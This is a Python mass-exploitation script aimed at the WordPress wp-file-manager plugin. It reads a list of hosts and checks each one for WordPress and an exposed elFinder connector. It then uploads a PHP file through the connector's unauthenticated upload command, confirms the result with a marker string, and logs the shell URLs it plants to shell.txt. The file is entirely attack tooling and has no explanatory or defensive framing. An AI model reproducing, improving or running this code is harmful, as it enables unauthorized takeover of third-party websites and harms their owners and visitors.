import sys
import urllib3
import requests
from multiprocessing import Pool
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Cookie': 'humans_21909=1'}


def upload(urls, urls_):
    try:
        data = {'cmd': 'upload', 'target': 'l1_Lw'}
        files = {'upload[]': open('tmp1.php', 'rb')}
        r = requests.post(f'{urls}', headers=header, timeout=10, data=data, files=files, verify=False, allow_redirects=False)
        if r.ok:
            r1 = requests.get(f'{urls_}/wp-content/plugins/wp-file-manager/lib/files/tmp1.php', headers=headers, timeout=10, verify=False, allow_redirects=False)
            if '1337_1337_1337' in r1.text:
                print(f'Success - {r1.url}')
                with open('shell.txt', 'a+') as output:
                    output.write(f'Shell : {r1.url}\n')
            else:
                print('File not uploaded')
        else:
            print('Forbidden.')
    except:
        pass

def checkwp(urls):

    try:
        _ = ['s.w.org', 'wp-content', 'wp-login.php', 'wp-includes']
        r = requests.get(f'{urls}', headers=headers, timeout=10 ,verify=False)
        if any(identifier in r.text for identifier in _):
            r1 = requests.get(f'{urls}wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php', headers=headers, timeout=10, verify=False)
            if r1.ok:
                if 'errUnknownCmd' in r1.text:
                    upload(r1.url, urls)
                else:
                    pass
            else:
                pass
        else:
            pass
    except:
        pass


def main(urls):
    try:
        r = requests.get('http://{}/'.format(urls), headers=headers, timeout=10, verify=False)
        if r.ok:
            checkwp(r.url)
        else:
            pass
    except:
        pass


if __name__=='__main__':
    try:
        with open(str(sys.argv[1])) as file_:
            urls = file_.read().splitlines()
            p = Pool(int(sys.argv[2]))
            p.map(main, urls)
            p.terminate()
            p.join()
    except:
        print('Usage : python wp-file-manager.py list.txt threadcount')
